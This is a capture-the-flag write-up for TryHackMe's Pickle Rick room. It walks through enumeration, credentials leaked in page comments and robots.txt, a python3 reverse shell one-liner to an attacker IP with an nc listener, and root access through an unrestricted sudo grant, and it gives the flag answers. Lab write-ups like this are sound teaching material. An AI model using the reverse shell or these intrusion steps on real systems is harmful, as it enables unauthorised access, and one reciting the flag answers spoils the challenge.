# Pickle Rick

![cover](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/76218595-8583-4014-957c-57ce94f50d5a)

## Enumeration
We begin by enumerating the machine with nmap :
```bash
nmap -sT -sV 10.10.68.55
```
![nmap](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/9ebffd57-d5ba-4c2c-9fcd-c0164217be27)

we notice only port `22` and `80` is open on the box so we explore the website and view the page source.

there is a comment on the page :
```html
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
so we find a username here and take note of it, next we visit the `robots.txt` file of the website.

there is a string here and we take note of it too :
```
Wubbalubbadubdub
```
then we begin fuzzing the website :
```
ffuf -w ~/wordlist/raft-medium-files.txt -u http://10.10.68.55/FUZZ
```
![ffuf](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/79ef34bb-68f2-4a96-91f4-c037b0bb9e30)


as the result shows, there is a login page (login.php) which we browse to this path :

![portal](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/e0de3357-0564-4794-ae18-4bd9ab6f3412)

we can use the previously found credentials here :
```
username : R1ckRul3s
password : Wubbalubbadubdub
```
the command panel page opens :

![panel](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/176df318-15bf-4c2b-a4cd-007110f2ce83)

here we can execute some bash commands like `ls` but afew commands such as `cat` are restricted.

## Gaining Shell

I tried a python3 reverse shell here and got the shell

on kali linux : 

```bash
nc -lvnp 4444
```

python3 reverse shell :

```python
export RHOST="10.18.57.234";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

we immediately can find the first ingredient :

![shell](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/3221224f-c8a4-417f-86d4-74f7c5299448)

then we navigate to `/home/rick` and the second ingredient is here :
```bash
$ cat 'second ingredients'
$ 1 jerry tear
```

## Privilege Escalation

By examining the SUDO permissions `sudo -l`, we see that we can run any commands as sudo :)
```bash
Matching Defaults entries for www-data on
    ip-10-10-68-55.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-68-55.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
we just run `sudo bash` and boom :)

![sudo](https://github.com/Git-K3rnel/TryHackMe_Challenge/assets/127470407/4272b2cb-4cfd-471a-ae37-2a056d01e97e)

navigate to `/root`, and here is the `3rd.txt` :
```text
3rd ingredients: fleeb juice
```

This is how you find all the ingredients to turn Rick back to his original form :)
